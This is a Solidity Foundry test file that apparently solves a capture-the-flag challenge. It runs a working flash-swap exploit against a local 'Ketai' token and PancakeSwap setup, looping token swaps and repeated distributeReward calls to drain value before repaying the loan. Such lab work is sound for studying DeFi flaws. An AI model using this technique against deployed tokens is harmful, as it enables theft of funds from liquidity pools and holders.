// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ketai/Challenge.sol";
import "../src/ketai/USDT.sol";
import "../src/ketai/USDC.sol";
import "../src/ketai/Ketai.sol";
import "../src/ketai/PancakeSwap/PancakePair.sol";
import "../src/ketai/PancakeSwap/PancakeRouter.sol";
import "../src/ketai/PancakeSwap/PancakeFactory.sol";

contract ContractTest is Test {
    PancakeFactory factory;
    PancakeRouter router;
    Challenge challenge;
    USDT usdt;
    USDC usdc;
    Ketai ketai;
    uint256 loanAmount;
    uint8 roundCount;

    function setUp() public {
        factory = new PancakeFactory(address(this));
        router = new PancakeRouter(address(factory), address(0));
        challenge = new Challenge(factory, router);
        usdt = challenge.usdt();
        usdc = challenge.usdc();
        ketai = challenge.ketai();
    }

    function testExploit2() public {
        for (uint i = 0; i < 2; i++) {
            testExploit(10);
            console.log("=====");
        }
        testExploit(5);
    }

    function testExploit(uint8 _roundCount) public {
        roundCount = _roundCount;
        PancakePair kcPair = PancakePair(
            factory.getPair(address(usdc), address(ketai))
        );

        uint256 a0out;
        uint256 a1out;
        loanAmount = ketai.balanceOf(address(kcPair)) - 1;
        (a0out, a1out) = address(usdc) < address(ketai)
            ? (uint256(0), loanAmount)
            : (uint256(loanAmount), uint256(0));
        kcPair.swap(a0out, a1out, address(this), "123");

        console.log("got ketai balance", ketai.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(ketai);
        path[1] = address(usdc);
        ketai.approve(address(router), ketai.balanceOf(address(this)));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ketai.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        console.log("got usdc balance", usdc.balanceOf(address(this)));
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        for (uint i = 0; i < roundCount; i++) {
            console.log("this ketai balance", ketai.balanceOf(address(this)));
            address[] memory path1 = new address[](2);
            path1[0] = address(ketai);
            path1[1] = address(usdt);
            ketai.approve(address(router), ketai.balanceOf(address(this)));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                ketai.balanceOf(address(this)),
                0,
                path1,
                address(this),
                block.timestamp
            );
            console.log("this usdt balance", usdt.balanceOf(address(this)));
            for (uint j = 0; j < 10; j++) {
                ketai.distributeReward();
            }

            address[] memory path2 = new address[](2);
            path2[0] = address(usdt);
            path2[1] = address(ketai);
            usdt.approve(address(router), usdt.balanceOf(address(this)));
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                usdt.balanceOf(address(this)),
                0,
                path2,
                address(this),
                block.timestamp
            );
            console.log("this ketai balance", ketai.balanceOf(address(this)));
        }

        PancakePair kcPair = PancakePair(
            factory.getPair(address(usdc), address(ketai))
        );
        ketai.transfer(address(kcPair), uint256(loanAmount * 2));
    }
}
